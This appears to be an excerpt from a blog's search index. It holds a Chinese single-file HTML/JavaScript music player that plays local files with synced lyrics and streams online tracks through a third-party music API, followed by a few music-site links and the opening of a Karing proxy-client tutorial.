--bg-gradient: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%); --container-bg: rgba(255, 255, 255, 0.6); --container-shadow: rgba(0, 0, 0, 0.1); --backdrop-blur: 12px; --text-color: #2c3e50; --text-secondary-color: #7f8c8d; --primary-color: #3498db; --primary-color-dark: #2980b9; --warning-color: #e74c3c; --item-hover-bg: rgba(52, 152, 219, 0.1); --item-current-bg: rgba(52, 152, 219, 0.2); --item-current-text: var(--primary-color); --border-color: rgba(0, 0, 0, 0.1); --lyrics-highlight-bg: rgba(46, 204, 113, 0.15); --lyrics-highlight-text: #27ae60; --lyrics-highlight-shadow: rgba(46, 204, 113, 0.2); --component-bg: rgba(255, 255, 255, 0.5); --scrollbar-thumb-bg: rgba(0, 0, 0, 0.2); --scrollbar-track-bg: transparent; } .dark-mode { --bg-gradient: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%); --container-bg: rgba(30, 30, 30, 0.6); --container-shadow: rgba(0, 0, 0, 0.3); --text-color: #ecf0f1; --text-secondary-color: #95a5a6; --primary-color: #5dade2; --primary-color-dark: #3498db; --item-hover-bg: rgba(93, 173, 226, 0.1); --item-current-bg: rgba(93, 173, 226, 0.2); --border-color: rgba(255, 255, 255, 0.15); --lyrics-highlight-bg: rgba(26, 188, 156, 0.15); --lyrics-highlight-text: #1abc9c; --component-bg: rgba(44, 44, 44, 0.5); --scrollbar-thumb-bg: rgba(255, 255, 255, 0.2); } ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: var(--scrollbar-track-bg); } ::-webkit-scrollbar-thumb { background: var(--scrollbar-thumb-bg); border-radius: 3px; } ::-webkit-scrollbar-thumb:hover { background: var(--primary-color); } body { font-family: var(--font-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; background-image: var(--bg-gradient); background-attachment: fixed; color: var(--text-color); transition: background 0.5s, color 0.5s; } .container { background: var(--container-bg); backdrop-filter: blur(var(--backdrop-blur)); -webkit-backdrop-filter: blur(var(--backdrop-blur)); padding: 35px; border-radius: 24px; box-shadow: 0 15px 30px var(--container-shadow); border: 1px solid var(--border-color); width: 100%; max-width: 850px; display: grid; grid-template-rows: auto auto auto 1fr auto; gap: 20px; transition: background 0.5s, box-shadow 0.5s; height: 90vh; max-height: 700px; } .header { text-align: center; position: relative; } .header h1 { margin: 0; font-size: 2.2em; font-weight: 700; color: var(--primary-color); letter-spacing: 1px; } .header .warning { color: var(--text-secondary-color); font-size: 0.9em; margin-top: 10px; font-style: italic; } .file-input-area { background: var(--component-bg); border: 2px dashed var(--border-color); border-radius: 16px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s ease; } .file-input-area:hover, .file-input-area.dragover { border-color: var(--primary-color); background: var(--item-hover-bg); } .file-input-area .file-input-label { display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--text-secondary-color); } .file-input-label i { font-size: 2em; margin-bottom: 10px; color: var(--primary-color); } .search-area { display: flex; gap: 10px; align-items: center; } .search-area input { flex-grow: 1; border: 1px solid var(--border-color); background-color: var(--component-bg); border-radius: 20px; padding: 10px 18px; font-size: 1em; color: var(--text-color); outline: none; transition: border-color 0.3s; font-family: inherit; } .search-area input:focus { border-color: var(--primary-color); } .search-area button { background: var(--primary-color); color: white; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 1.1em; cursor: pointer; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease; } .search-area button:hover { background: var(--primary-color-dark); transform: scale(1.05); } .search-area button:disabled { background: var(--text-secondary-color); cursor: not-allowed; transform: none; } .view-toggle { display: none; } .main-content { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; overflow: hidden; } .playlist, .lyrics { background: var(--component-bg); border-radius: 16px; padding: 20px; border: 1px solid var(--border-color); height: 100%; overflow-y: auto; } .playlist div { padding: 12px 15px; border-radius: 10px; transition: all 0.2s ease-in-out; cursor: pointer; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .playlist div:hover { background-color: var(--item-hover-bg); color: var(--item-current-text); transform: translateX(5px); } .playlist .current { color: var(--item-current-text); font-weight: 500; background-color: var(--item-current-bg); } .lyrics { text-align: center; font-size: 1.1em; line-height: 2.2; } .lyrics div { white-space: pre-wrap; } .lyrics .current { color: var(--lyrics-highlight-text); font-weight: 700; background-color: var(--lyrics-highlight-bg); transform: scale(1.05); box-shadow: 0 4px 15px var(--lyrics-highlight-shadow); } .controls { display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: wrap; } .controls button { background: var(--primary-color); color: white; border: none; border-radius: 50%; cursor: pointer; font-size: 1.2em; width: 50px; height: 50px; display: flex; justify-content: center; align-items: center; transition: all 0.2s ease; box-shadow: 0 4px 10px rgba(0,0,0,0.1); } .controls button:hover { background: var(--primary-color-dark); transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0,0,0,0.15); } .controls button:active { transform: translateY(0); box-shadow: 0 2px 5px rgba(0,0,0,0.1); } .controls button#loadOnlineBtn { width: auto; border-radius: 25px; padding: 0 25px; gap: 10px; } .controls button:disabled { background: var(--text-secondary-color); cursor: not-allowed; transform: none; box-shadow: none; } .controls audio { flex-grow: 1; min-width: 300px; } .loader { width: 20px; height: 20px; border: 3px solid var(--primary-color); border-bottom-color: transparent; border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite; } @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .theme-switch-wrapper { position: absolute; top: 0px; right: 0px; } .theme-switch { display: inline-block; height: 24px; position: relative; width: 48px; } .theme-switch input { display:none; } .slider { background-color: #ccc; bottom: 0; cursor: pointer; left: 0; position: absolute; right: 0; top: 0; transition: .4s; border-radius: 24px; } .slider:before { background-color: #fff; bottom: 3px; content: \u0026#34;\u0026#34;; height: 18px; left: 3px; position: absolute; transition: .4s; width: 18px; border-radius: 50%; } .slider .fa-sun, .slider .fa-moon { position: absolute; top: 50%; transform: translateY(-50%); color: #fff; font-size: 12px; opacity: 0; transition: opacity 0.4s; } .slider .fa-sun { left: 6px; opacity: 1; } .slider .fa-moon { right: 6px; } input:checked + .slider { background-color: var(--primary-color); } input:checked + .slider:before { transform: translateX(24px); } input:checked + .slider .fa-sun { opacity: 0; } input:checked + .slider .fa-moon { opacity: 1; } @media (max-width: 768px) { body { padding: 0; } .container { padding: 15px; gap: 15px; grid-template-rows: auto auto auto auto 1fr auto; border-radius: 0; border: none; height: 100vh; max-height: none; } .header h1 { font-size: 1.8em; } .file-input-area { padding: 15px; } .file-input-label i { font-size: 1.8em; } .view-toggle { display: flex; gap: 10px; } .view-toggle button { flex-grow: 1; background: var(--component-bg); color: var(--text-secondary-color); border: 1px solid var(--border-color); padding: 10px; border-radius: 10px; font-size: 0.9em; font-family: inherit; cursor: pointer; transition: all 0.3s ease; } .view-toggle button.active { background: var(--primary-color); color: white; font-weight: 500; border-color: var(--primary-color); } .main-content { display: flex; grid-template-columns: none; } .playlist, .lyrics { width: 100%; flex-shrink: 0; } .mobile-hidden { display: none !important; } .lyrics { line-height: 1.8; font-size: 1em; } .controls { flex-wrap: wrap; gap: 10px; align-items: center; } .controls audio { order: -1; width: 100%; min-width: unset; } .controls button { font-size: 1.1em; width: 48px; height: 48px; } .controls button#loadOnlineBtn { flex-grow: 1; width: auto; max-width: 180px; } } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;theme-switch-wrapper\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;theme-switch\u0026#34; for=\u0026#34;checkbox\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;checkbox\u0026#34; /\u0026gt;\u0026lt;div class=\u0026#34;slider\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-sun\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;i class=\u0026#34;fas fa-moon\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h1\u0026gt;音乐播放器\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;warning\u0026#34;\u0026gt;支持本地音乐与在线雷达探索\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-input-area\u0026#34; id=\u0026#34;fileDropArea\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;fileInput\u0026#34; multiple accept=\u0026#34;audio/*,.lrc,.txt\u0026#34; style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;fileInput\u0026#34; class=\u0026#34;file-input-label\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-folder-plus\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;span\u0026gt;点击选择 或 拖放本地音乐文件至此\u0026lt;/span\u0026gt;\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;search-area\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;search\u0026#34; id=\u0026#34;searchInput\u0026#34; placeholder=\u0026#34;搜索在线歌曲、歌手...\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;searchBtn\u0026#34; title=\u0026#34;搜索\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-search\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;view-toggle\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;showPlaylistBtn\u0026#34; class=\u0026#34;active\u0026#34;\u0026gt;播放列表\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;showLyricsBtn\u0026#34;\u0026gt;歌词\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;main-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;playlist\u0026#34; id=\u0026#34;playlist\u0026#34;\u0026gt;请选择本地音乐或探索在线雷达\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;lyrics mobile-hidden\u0026#34; id=\u0026#34;lyrics\u0026#34;\u0026gt;歌词将在此处同步显示\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button onclick=\u0026#34;playPrevious()\u0026#34; title=\u0026#34;上一曲\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-backward-step\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;audio id=\u0026#34;audioPlayer\u0026#34; controls\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;button onclick=\u0026#34;playNext()\u0026#34; title=\u0026#34;下一曲\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-forward-step\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;loadOnlineBtn\u0026#34; title=\u0026#34;聚合所有雷达，探索新音乐\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;btn-text\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-satellite-dish\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; 探索雷达\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;loader\u0026#34; style=\u0026#34;display: none;\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/jsmediatags/3.9.7/jsmediatags.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const dom = { playlist: document.getElementById(\u0026#39;playlist\u0026#39;), lyrics: document.getElementById(\u0026#39;lyrics\u0026#39;), audioPlayer: document.getElementById(\u0026#39;audioPlayer\u0026#39;), themeToggle: document.getElementById(\u0026#39;checkbox\u0026#39;), loadOnlineBtn: document.getElementById(\u0026#39;loadOnlineBtn\u0026#39;), fileInput: document.getElementById(\u0026#39;fileInput\u0026#39;), fileDropArea: document.getElementById(\u0026#39;fileDropArea\u0026#39;), showPlaylistBtn: document.getElementById(\u0026#39;showPlaylistBtn\u0026#39;), showLyricsBtn: document.getElementById(\u0026#39;showLyricsBtn\u0026#39;), searchInput: document.getElementById(\u0026#39;searchInput\u0026#39;), searchBtn: document.getElementById(\u0026#39;searchBtn\u0026#39;), }; const API = { name: \u0026#39;GD Studio API\u0026#39;, baseUrl: \u0026#39;https://music-api.gdstudio.xyz/api.php\u0026#39;, getList: async (keyword) =\u0026gt; { const url = `${API.baseUrl}?types=search\u0026amp;source=netease,kuwo\u0026amp;name=${encodeURIComponent(keyword)}\u0026amp;count=100`; const response = await fetch(url); if (!response.ok) throw new Error(\u0026#39;API request failed\u0026#39;); const data = await response.json(); if (!Array.isArray(data)) throw new Error(\u0026#39;Invalid API response\u0026#39;); return data.map(song =\u0026gt; ({ id: song.id, name: song.name, artists: [{ name: song.artist.join(\u0026#39; / \u0026#39;) }], source: song.source, lyric_id: song.lyric_id, })); }, getSongUrl: (song) =\u0026gt; `${API.baseUrl}?types=url\u0026amp;id=${song.id}\u0026amp;source=${song.source || \u0026#39;netease\u0026#39;}\u0026amp;br=320000`, getLyric: (song) =\u0026gt; `${API.baseUrl}?types=lyric\u0026amp;id=${song.lyric_id || song.id}\u0026amp;source=${song.source || \u0026#39;netease\u0026#39;}`, }; const state = { isOnlineMode: false, audioFiles: [], lyricsFiles: {}, onlineSongs: [], currentTrackIndex: -1, currentAudioUrl: null, lyricsData: [], currentLyricLine: -1, }; window.addEventListener(\u0026#39;load\u0026#39;, setupInteractions); dom.audioPlayer.addEventListener(\u0026#39;ended\u0026#39;, autoPlayNext); dom.audioPlayer.addEventListener(\u0026#39;timeupdate\u0026#39;, syncLyrics); function setupInteractions() { const savedTheme = localStorage.getItem(\u0026#39;theme\u0026#39;); if (savedTheme) { document.body.classList.toggle(\u0026#39;dark-mode\u0026#39;, savedTheme === \u0026#39;dark\u0026#39;); dom.themeToggle.checked = savedTheme === \u0026#39;dark\u0026#39;; } dom.themeToggle.addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; { const isDark = e.target.checked; document.body.classList.toggle(\u0026#39;dark-mode\u0026#39;, isDark); localStorage.setItem(\u0026#39;theme\u0026#39;, isDark ? \u0026#39;dark\u0026#39; : \u0026#39;light\u0026#39;); }); dom.loadOnlineBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; fetchOnlineMusic(\u0026#39;热门\u0026#39;, true)); dom.searchBtn.addEventListener(\u0026#39;click\u0026#39;, handleSearch); dom.searchInput.addEventListener(\u0026#39;keypress\u0026#39;, (e) =\u0026gt; { if (e.key === \u0026#39;Enter\u0026#39;) { handleSearch(); } }); dom.fileInput.addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; processFiles(e.target.files)); dom.fileDropArea.addEventListener(\u0026#39;dragover\u0026#39;, (e) =\u0026gt; { e.preventDefault(); e.currentTarget.classList.add(\u0026#39;dragover\u0026#39;); }); dom.fileDropArea.addEventListener(\u0026#39;dragleave\u0026#39;, (e) =\u0026gt; e.currentTarget.classList.remove(\u0026#39;dragover\u0026#39;)); dom.fileDropArea.addEventListener(\u0026#39;drop\u0026#39;, (e) =\u0026gt; { e.preventDefault(); e.currentTarget.classList.remove(\u0026#39;dragover\u0026#39;); processFiles(e.dataTransfer.files); }); dom.showPlaylistBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; switchMobileView(\u0026#39;playlist\u0026#39;)); dom.showLyricsBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; switchMobileView(\u0026#39;lyrics\u0026#39;)); } function handleSearch() { const keyword = dom.searchInput.value.trim(); if (keyword) { fetchOnlineMusic(keyword, false); // false 表示不随机打乱搜索结果 } else { // 可以给用户一个提示，例如输入框闪烁 dom.searchInput.focus(); } } async function fetchOnlineMusic(keyword, shuffle = false) { state.isOnlineMode = true; if (window.innerWidth \u0026lt;= 768) switchMobileView(\u0026#39;playlist\u0026#39;); const btnText = dom.loadOnlineBtn.querySelector(\u0026#39;.btn-text\u0026#39;); const loader = dom.loadOnlineBtn.querySelector(\u0026#39;.loader\u0026#39;); // 同时禁用“探索”和“搜索”按钮，防止重复点击 dom.loadOnlineBtn.disabled = true; dom.searchBtn.disabled = true; btnText.style.display = \u0026#39;none\u0026#39;; loader.style.display = \u0026#39;inline-block\u0026#39;; dom.playlist.innerHTML = `\u0026lt;div\u0026gt;正在加载 \u0026#34;${keyword}\u0026#34;...\u0026lt;/div\u0026gt;`; try { const songs = await API.getList(keyword); if (shuffle) { // 如果是探索模式，则打乱数组 shuffleArray(songs); } state.onlineSongs = songs; renderOnlinePlaylist(); // 渲染播放列表 if (state.onlineSongs.length \u0026gt; 0) { // 搜索后不自动播放第一首，让用户自己选择。探索模式则保持自动播放。 if (shuffle) { findAndPlayOnlineSong(0); } } else { dom.playlist.innerHTML = `\u0026lt;div\u0026gt;未能找到关于 \u0026#34;${keyword}\u0026#34; 的在线歌曲。\u0026lt;/div\u0026gt;`; } } catch (error) { console.error(\u0026#34;加载在线歌曲时发生错误:\u0026#34;, error); dom.playlist.innerHTML = \u0026#34;\u0026lt;div\u0026gt;加载失败，请检查网络或API源。\u0026lt;/div\u0026gt;\u0026#34;; } finally { dom.loadOnlineBtn.disabled = false; dom.searchBtn.disabled = false; btnText.style.display = \u0026#39;inline-block\u0026#39;; loader.style.display = \u0026#39;none\u0026#39;; } } async function playOnlineSong(index) { state.isOnlineMode = true; state.currentTrackIndex = index; updatePlaylistHighlight(); resetLyrics(); const song = state.onlineSongs[index]; dom.lyrics.innerHTML = `\u0026lt;div\u0026gt;正在加载: ${song.name}\u0026lt;/div\u0026gt;`; const urlEndpoint = API.getSongUrl(song); const urlData = await fetch(urlEndpoint).then(res =\u0026gt; res.json()); const audioUrl = urlData.url?.replace(/^http:/, \u0026#39;https\u0026#39;); if (!audioUrl) throw new Error(\u0026#39;无效的播放地址\u0026#39;); dom.audioPlayer.src = audioUrl; dom.audioPlayer.load(); dom.audioPlayer.play(); try { const lyricEndpoint = API.getLyric(song); const lyricData = await fetch(lyricEndpoint).then(res =\u0026gt; res.json()); if (lyricData.lyric) { displayLyrics(lyricData.lyric); } else { dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;未找到在线歌词。\u0026lt;/div\u0026gt;\u0026#39;; } } catch (lyricError) { dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;歌词加载失败。\u0026lt;/div\u0026gt;\u0026#39;; } } function renderOnlinePlaylist() { dom.playlist.innerHTML = state.onlineSongs.map((s, i) =\u0026gt; `\u0026lt;div id=\u0026#34;track-item-${i}\u0026#34; onclick=\u0026#34;findAndPlayOnlineSong(${i})\u0026#34;\u0026gt; ${s.name} - ${s.artists.map(a =\u0026gt; a.name).join(\u0026#39;/\u0026#39;)} \u0026lt;/div\u0026gt;` ).join(\u0026#39;\u0026#39;) || \u0026#34;\u0026lt;div\u0026gt;列表为空\u0026lt;/div\u0026gt;\u0026#34;; } function switchMobileView(view) { if (window.innerWidth \u0026gt; 768) return; if (view === \u0026#39;playlist\u0026#39;) { dom.showPlaylistBtn.classList.add(\u0026#39;active\u0026#39;); dom.showLyricsBtn.classList.remove(\u0026#39;active\u0026#39;); dom.playlist.classList.remove(\u0026#39;mobile-hidden\u0026#39;); dom.lyrics.classList.add(\u0026#39;mobile-hidden\u0026#39;); } else { dom.showPlaylistBtn.classList.remove(\u0026#39;active\u0026#39;); dom.showLyricsBtn.classList.add(\u0026#39;active\u0026#39;); dom.playlist.classList.add(\u0026#39;mobile-hidden\u0026#39;); dom.lyrics.classList.remove(\u0026#39;mobile-hidden\u0026#39;); } } function playPrevious() { if (state.currentTrackIndex \u0026lt;= 0) return; const newIndex = state.currentTrackIndex - 1; state.isOnlineMode ? findAndPlayOnlineSong(newIndex) : playAudio(newIndex); } function playNext() { const limit = state.isOnlineMode ? state.onlineSongs.length : state.audioFiles.length; if (state.currentTrackIndex \u0026gt;= limit - 1) { dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;已是列表最后一首。\u0026lt;/div\u0026gt;\u0026#39;; return; } const newIndex = state.currentTrackIndex + 1; state.isOnlineMode ? findAndPlayOnlineSong(newIndex) : playAudio(newIndex); } function autoPlayNext() { playNext(); } function processFiles(files) { if (files.length === 0) return; state.isOnlineMode = false; if (window.innerWidth \u0026lt;= 768) switchMobileView(\u0026#39;playlist\u0026#39;); let newFilesAdded = false; for (const file of files) { const ext = file.name.split(\u0026#39;.\u0026#39;).pop().toLowerCase(); const baseName = file.name.split(\u0026#39;.\u0026#39;).slice(0, -1).join(\u0026#39;.\u0026#39;); if ([\u0026#39;mp3\u0026#39;, \u0026#39;wav\u0026#39;, \u0026#39;ogg\u0026#39;, \u0026#39;m4a\u0026#39;, \u0026#39;flac\u0026#39;, \u0026#39;aac\u0026#39;, \u0026#39;wma\u0026#39;].includes(ext)) { if (!state.audioFiles.some(f =\u0026gt; f.name === file.name)) { state.audioFiles.push(file); newFilesAdded = true; } } else if ([\u0026#39;lrc\u0026#39;, \u0026#39;txt\u0026#39;].includes(ext)) { state.lyricsFiles[baseName] = file; } } if (newFilesAdded) renderLocalPlaylist(); if (state.audioFiles.length \u0026gt; 0 \u0026amp;\u0026amp; dom.audioPlayer.paused) playAudio(0); } function playAudio(index) { if (index \u0026lt; 0 || index \u0026gt;= state.audioFiles.length) return; if (state.currentAudioUrl) URL.revokeObjectURL(state.currentAudioUrl); state.isOnlineMode = false; state.currentTrackIndex = index; updatePlaylistHighlight(); const audioFile = state.audioFiles[index]; state.currentAudioUrl = URL.createObjectURL(audioFile); dom.audioPlayer.src = state.currentAudioUrl; dom.audioPlayer.load(); dom.audioPlayer.play(); resetLyrics(); loadLyricsForFile(audioFile); } async function findAndPlayOnlineSong(startIndex) { for (let i = startIndex; i \u0026lt; state.onlineSongs.length; i++) { try { await playOnlineSong(i); return; } catch (error) { console.warn(`第 ${i + 1} 首 (${state.onlineSongs[i].name}) 尝试失败，跳过...`, error.message); } } dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;抱歉，当前列表中的歌曲均无法播放。\u0026lt;/div\u0026gt;\u0026#39;; } function renderLocalPlaylist() { dom.playlist.innerHTML = state.audioFiles.map((f, i) =\u0026gt; `\u0026lt;div id=\u0026#34;track-item-${i}\u0026#34; onclick=\u0026#34;playAudio(${i})\u0026#34;\u0026gt;${f.name}\u0026lt;/div\u0026gt;`).join(\u0026#39;\u0026#39;) || \u0026#34;\u0026lt;div\u0026gt;请选择本地音乐\u0026lt;/div\u0026gt;\u0026#34;; } function updatePlaylistHighlight() { const items = dom.playlist.querySelectorAll(\u0026#39;div\u0026#39;); let currentItem = null; items.forEach((item, index) =\u0026gt; { const isCurrent = index === state.currentTrackIndex; item.classList.toggle(\u0026#39;current\u0026#39;, isCurrent); if (isCurrent) currentItem = item; }); if (currentItem) { currentItem.scrollIntoView({ behavior: \u0026#39;smooth\u0026#39;, block: \u0026#39;center\u0026#39;, inline: \u0026#39;nearest\u0026#39; }); } } function resetLyrics() { state.lyricsData = []; state.currentLyricLine = -1; dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;...\u0026lt;/div\u0026gt;\u0026#39;; } async function loadLyricsForFile(audioFile) { const baseName = audioFile.name.split(\u0026#39;.\u0026#39;).slice(0, -1).join(\u0026#39;.\u0026#39;); const lyricsFile = state.lyricsFiles[baseName]; if (lyricsFile) { const reader = new FileReader(); reader.onload = (e) =\u0026gt; displayLyrics(e.target.result); reader.readAsText(lyricsFile); } else { readEmbeddedLyrics(audioFile); } } function readEmbeddedLyrics(file) { jsmediatags.read(file, { onSuccess: (tag) =\u0026gt; { const lyricsText = tag.tags.USLT?.data ?? tag.tags.SYLT?.data ?? tag.tags.lyrics; if (lyricsText) { displayLyrics(lyricsText); } else { dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;未找到任何歌词。\u0026lt;/div\u0026gt;\u0026#39;; } }, onError: () =\u0026gt; { dom.lyrics.innerHTML = \u0026#39;\u0026lt;div\u0026gt;读取内嵌歌词失败。\u0026lt;/div\u0026gt;\u0026#39;; } }); } function parseLrc(text) { if (!text) return []; const lines = text.split(\u0026#39;\\n\u0026#39;); const result = []; const timeRegex = /\\[(\\d{2}):(\\d{2})[.:](\\d{2,3})\\]/g; for (const line of lines) { const textContent = line.replace(timeRegex, \u0026#39;\u0026#39;).trim(); if (textContent) { let match; timeRegex.lastIndex = 0; while ((match = timeRegex.exec(line)) !== null) { const minutes = parseInt(match[1], 10); const seconds = parseInt(match[2], 10); const milliseconds = parseInt(match[3].padEnd(3, \u0026#39;0\u0026#39;), 10); result.push({ time: minutes * 60 + seconds + milliseconds / 1000, text: textContent }); } } } return result.sort((a, b) =\u0026gt; a.time - b.time); } function displayLyrics(lrcText) { state.lyricsData = parseLrc(lrcText); if (state.lyricsData.length \u0026gt; 0) { dom.lyrics.innerHTML = state.lyricsData.map((item, index) =\u0026gt; `\u0026lt;div id=\u0026#34;lyric-line-${index}\u0026#34;\u0026gt;${item.text}\u0026lt;/div\u0026gt;`).join(\u0026#39;\u0026#39;); } else { dom.lyrics.innerHTML = lrcText.split(\u0026#39;\\n\u0026#39;).map(line =\u0026gt; `\u0026lt;div\u0026gt;${line || \u0026#39;\u0026amp;nbsp;\u0026#39;}\u0026lt;/div\u0026gt;`).join(\u0026#39;\u0026#39;); } state.currentLyricLine = -1; syncLyrics(); } function syncLyrics() { if (state.lyricsData.length === 0 || dom.audioPlayer.paused) return; const currentTime = dom.audioPlayer.currentTime; let newIndex = state.lyricsData.findIndex((line, i) =\u0026gt; { const nextLine = state.lyricsData[i + 1]; return currentTime \u0026gt;= line.time \u0026amp;\u0026amp; (nextLine ? currentTime \u0026lt; nextLine.time : true); }); if (newIndex !== -1 \u0026amp;\u0026amp; newIndex !== state.currentLyricLine) { const prevLine = document.getElementById(`lyric-line-${state.currentLyricLine}`); if (prevLine) prevLine.classList.remove(\u0026#39;current\u0026#39;); const currentLine = document.getElementById(`lyric-line-${newIndex}`); if (currentLine) { currentLine.classList.add(\u0026#39;current\u0026#39;); if (dom.lyrics.offsetParent !== null) { currentLine.scrollIntoView({ behavior: \u0026#39;smooth\u0026#39;, block: \u0026#39;center\u0026#39; }); } } state.currentLyricLine = newIndex; } } function shuffleArray(array) { let currentIndex = array.length, randomIndex; while (currentIndex != 0) { randomIndex = Math.floor(Math.random() * currentIndex); currentIndex--; [array[currentIndex], array[randomIndex]] = [array[randomIndex], array[currentIndex]]; } return array; } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; or\nhttps://www.gequbao.com/\nhttps://www.qeecc.com/ https://music.gdstudio.xyz/ https://music.gdstudio.xyz/gdmusic.apk api https://music-api.gdstudio.xyz/api.php\n","permalink":"https://qfsyso.github.io/posts/mp3/","summary":"MP3 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;音乐播放器 (桌面/移动端优化)\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@300;400;500;700\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css\u0026#34;\u0026gt; \u0026lt;style\u0026gt; :root { --font-main: \u0026#39;Noto Sans SC\u0026#39;, \u0026#39;Segoe UI\u0026#39;, Arial, sans-serif; --bg-gradient: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%); --container-bg: rgba(255, 255, 255, 0.6); --container-shadow: rgba(0, 0, 0, 0.1); --backdrop-blur: 12px; --text-color: #2c3e50; --text-secondary-color: #7f8c8d; --primary-color: #3498db; --primary-color-dark: #2980b9; --warning-color: #e74c3c; --item-hover-bg: rgba(52, 152, 219, 0.","title":"MP3"},{"content":"Karing 客户端使用教程 (Windows \u0026amp; iOS) Karing 是一款兼容 Clash 的通用代理工具，支持 Clash / V2Ray / Shadowsocks 等协议。\n目前官方提供 Windows、MacOS、Android、iOS、tvOS 等客户端。\nWindows 和 iOS 的使用方法。\n1. Windows 客户端 1.1 下载 Karing Windows 客户端可在以下位置下载：\nGitHub Release：KaringX/karing 官网：karing.app 提供两种版本：\n安装版：常规安装使用 绿色版：解压即可使用（推荐） 1.2 设置分流 打开客户端，点击右下角 分流 将 国家/地区 设置为你当前上网地区 Rule Set 保持默认即可（内置规则有效） 1.3 添加订阅 点击左上角 设置 → 